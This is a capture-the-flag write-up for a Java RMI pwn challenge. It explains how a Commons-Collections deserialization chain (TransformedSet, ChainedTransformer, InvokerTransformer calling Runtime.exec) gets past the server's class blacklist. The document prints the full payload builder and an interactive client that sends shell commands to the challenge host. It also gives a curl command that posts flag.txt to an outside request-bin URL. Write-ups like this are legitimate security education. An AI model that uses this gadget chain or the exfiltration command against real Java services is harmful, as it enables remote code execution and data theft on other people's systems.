# Array List (Pwn, 350p)

The task is similar to https://github.com/p4-team/ctf/tree/master/2018-01-20-insomnihack/pwn_magic_hat and a bit to https://github.com/p4-team/ctf/tree/master/2016-08-21-bioterra-ctf/akashic_records

In short: we have a Java RMI server running, and we need to craft a deserialization chain to exploit this server.
We get a [client](client.jar) and [library](notsoserial-modified.jar) which is added on the server.
We can add those jars to IntelliJ project and it will decompile the code on the fly for us.

Client is trivial, it connects to the server and uses the Remote API.
The API is:

```java
public interface Service extends Remote {
    Store getStore() throws RemoteException;

    Store createArrayList(Store var1) throws RemoteException;

    Store createFastArrayList(Store var1) throws RemoteException;

    String getString(Store var1, int var2) throws RemoteException;

    Store addRandom(Store var1, int var2) throws RemoteException;
}
```

And Store class is:

```java
import java.io.Serializable;
import java.util.ArrayList;
import java.util.Collection;
import org.apache.commons.collections.FastArrayList;

public class Store implements Serializable {
    private static final long serialVersionUID = -878586296715953149L;
    public Collection[] collections = new Collection[10];
    public int counter = 0;
    private static final int MAX_COLLECTIONS = 10;

    public Store() {
    }

    public int createArrayList() {
        if (this.counter == 10) {
            return 0;
        } else {
            ArrayList<Integer> list = new ArrayList();
            this.collections[this.counter++] = list;
            return 1;
        }
    }

    public int createFastArrayList() {
        if (this.counter == 10) {
            return 0;
        } else {
            FastArrayList list = new FastArrayList();
            this.collections[this.counter++] = list;
            return 1;
        }
    }

    public int insert(int index, Object obj) {
        if (index >= 0 && index < 10) {
            if (this.collections[index] == null) {
                return 0;
            } else {
                this.collections[index].add(obj);
                return 1;
            }
        } else {
            return 0;
        }
    }
}
```

Store class is the one we need to use for the exploit, since it's the object we can send to the server and server will deserialize it.
We can see that it contains an array of Collections, and we will use a very particular collection to exploit the server.

There is one small obstacle:

```java
        this.blacklist.add(this.internalName("java.lang.reflect.InvocationHandler"));
        this.blacklist.add(this.internalName("org.apache.commons.beanutils.BeanComparator"));
        this.blacklist.add(this.internalName("org.apache.commons.collections.map.LazyMap"));
        this.blacklist.add(this.internalName("org.apache.commons.collections4.comparators.TransformingComparator"));
        this.blacklist.add(this.internalName("org.apache.commons.collections4.functors.InstantiateTransformer"));
        this.blacklist.add(this.internalName("org.apache.commons.collections.keyvalue.TiedMapEntry"));
        this.blacklist.add(this.internalName("org.apache.commons.fileupload.disk.DiskFileItem"));
        this.blacklist.add(this.internalName("org.apache.commons.io.output.DeferredFileOutputStream"));
        this.blacklist.add(this.internalName("org.hibernate.tuple.component.AbstractComponentTuplizer"));
        this.blacklist.add(this.internalName("com.sun.rowset.JdbcRowSetImpl"));
        this.blacklist.add(this.internalName("org.jboss.interceptor.proxy.InterceptorMethodHandler"));
        this.blacklist.add(this.internalName("sun.rmi.transport.tcp.TCPEndpoint"));
        this.blacklist.add(this.internalName("sun.rmi.server.ActivationGroupImpl"));
        this.blacklist.add(this.internalName("javax.xml.transform.Templates"));
        this.blacklist.add(this.internalName("java.lang.reflect.Modifier"));
        this.blacklist.add(this.internalName("java.net.URLConnection"));
        this.blacklist.add(this.internalName("org.apache.commons.collections.functors.InstantiateTransformer"));
        this.blacklist.add(this.internalName("org.apache.commons.collections4.functors.InstantiateTransformer"));
        this.blacklist.add(this.internalName("org.codehaus.groovy.runtime.ConvertedClosure"));
        this.blacklist.add(this.internalName("org.codehaus.groovy.runtime.MethodClosure"));
        this.blacklist.add(this.internalName("org.springframework.beans.factory.ObjectFactory"));
        this.blacklist.add(this.internalName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"));
```

So we can't use some of the classes.
Server can create for us `org.apache.commons.collections.FastArrayList` which means there has to be commons-collections on the server.

Specifically we will use `TransformedSet` decorator.
To use it we need a `Set` and `Transformer`.
The idea is that every time we add something to this `TransformedSet`, the actual value stored will be a result of calling Transformer on the passed value.
A useful Transformer is `ChainedTransformer`, which calls multiple Transformers in a chain.
We will also need `ConstantTransformer` which simply returns a constant value every time, and finally `InvokerTransformer` which can call functions.

What we want to call in the end is `Runtime.getRuntime().exec("command")`.

ConstantTransformer has to actually return and object so we will pass there `Runtime.class` metaclass object so we need `new ConstantTransformer(Runtime.class)`

From there we can use reflection to get handle of a method by calling `.getMethod("getRuntime")` so the code will be `new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]})`

Now we actually want to invoke this `getRuntime` to get handle of the `Runtime` object, so we need `new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]})`

Finally we want to run `exec("command")` function of the Runtime class, so we do `new InvokerTransformer("exec",new Class[]{String.class}, new String[]{command})`

Keep in mind we need to return some value from this TransformerChain, so it can get stored in the Set in the end, so we simply pass another ConstantTransformer.
As a result we have:

```java
public static Store preparePayload(final String command) {
	final Transformer[] transformers = new Transformer[]{
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[]{
					String.class, Class[].class}, new Object[]{
					"getRuntime", new Class[0]}),
			new InvokerTransformer("invoke", new Class[]{
					Object.class, Object[].class}, new Object[]{
					null, new Object[0]}),
			new InvokerTransformer("exec",
					new Class[]{String.class}, new String[]{command}),
			new ConstantTransformer(1)};
	final Transformer transformerChain = new ChainedTransformer(transformers);
	Set<Integer> backingSet = new HashSet<>();
	Set transformedSet = TransformedSet.decorate(backingSet, transformerChain);
	Store store = new Store();
	store.collections[0] = transformedSet;
	return store;
}
```

It's very useful that the server has `addRandom` method, which adds something to the collection we provide.
Otherwise we would need a bit more magic, to store values on our side, without invoking the transformer chain.
This would require adding a "fake" transformer, adding values and then substituting the transformer for the chain, using reflection (so it doesn't trigger).
Fortunately we can simply send empty Set, and ask server to add values, which will trigger the chain.

Now we just need to connect to the remote endpoint and start sending commands:

```java
public static void main(final String[] args) throws Exception {
	System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
	Registry registry = LocateRegistry.getRegistry(InetAddress.getByName("arraylist.dhavalkapil.com").getHostName(), 9999);
	Service service = (Service) registry.lookup("backdoor");
	Scanner sc = new Scanner(System.in);
	while (true) {
		System.out.print("> ");
		execCommand(service, sc.nextLine());
	}
}

private static void execCommand(Service service, String command) {
	try {
		service.addRandom(preparePayload(command), 0);
	} catch (Exception e) {
		e.printStackTrace();
	}
}
```

We know the flag is in `flag.txt` file so we can just grab it with simple `curl -d @flag.txt -X POST https://requestb.in/XXXXX` and we get `CTF{j4v4_64d637_ch41n1n6_15_fun}`

